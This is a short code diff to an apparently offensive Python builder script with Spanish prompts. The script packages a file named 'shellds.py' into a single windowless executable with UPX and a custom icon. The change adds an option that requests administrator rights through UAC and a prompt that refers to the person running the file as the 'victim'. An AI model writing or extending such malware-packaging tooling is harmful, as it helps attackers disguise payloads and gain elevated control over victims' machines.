@@ -55,13 +55,32 @@ def icon():
         icon()
 # MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
 # MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+def admin():
+    q_admin_p = input('\033[1m' + '¿Deseas añadir permisos Administrativos al .exe?\n Y/N:  ' + '\033[0m')
+    if not q_admin_p:
+        admin()
+    elif q_admin_p.lower() == 'y':
+        print('\033[1m' + 'El ejecutable tendrá que ser ejecutado por la victima con permisos Administrativos hacer doble click en el .exe' + '\033[0m')
+        var = '--uac-admin'
+        return var
+    elif q_admin_p.lower() == 'n':
+        var2 = ' '
+        return var2
+    else:
+        admin()
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
+# MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
 def compile_to_exe():
     y_n = input('\033[1m' + '¿Quieres compilar el Archivo a .exe?\n Y/N:  ' + '\033[0m')
     
     if not y_n:
         compile_to_exe()
     elif y_n.lower() == 'y':
-        os.system(f'python3 -m PyInstaller --onefile --noconsole "./shellds.py" --upx-dir "/upx/" --icon "{icon()}"')
+        os.system(f'python3 -m PyInstaller --onefile --noconsole "./shellds.py" --upx-dir "/upx/" --icon "{icon()}" {admin()}')
     elif y_n.lower() == 'n':
         input('\033[1m' + 'Pulsa Enter para Cerrar esta ventana o pulsa cualquier otra tecla.' + '\033[0m')
         exit()
